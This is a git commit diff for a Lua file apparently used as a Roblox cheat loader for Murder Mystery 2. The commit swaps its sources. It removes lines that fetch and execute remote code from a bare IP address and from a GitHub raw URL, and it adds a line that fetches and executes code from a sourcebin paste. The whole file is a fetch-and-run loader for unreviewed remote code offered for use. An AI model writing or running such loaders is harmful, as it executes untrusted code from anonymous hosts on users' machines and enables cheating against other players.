a88997d80090577c9e79415bfa10a81408f8d6bb
zcwi4crpz <innierdabodabo@gmail.com>
2026-07-15 17:37:58 +0800

    Update Waguriii.lua

--- Waguriii.lua
+++ Waguriii.lua
@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("http://109.120.157.241:5000/mm2.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Waguriiiii/Murder-mystery-2/refs/heads/main/Waguri.lua"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/3VIftRoWsd/0"))()
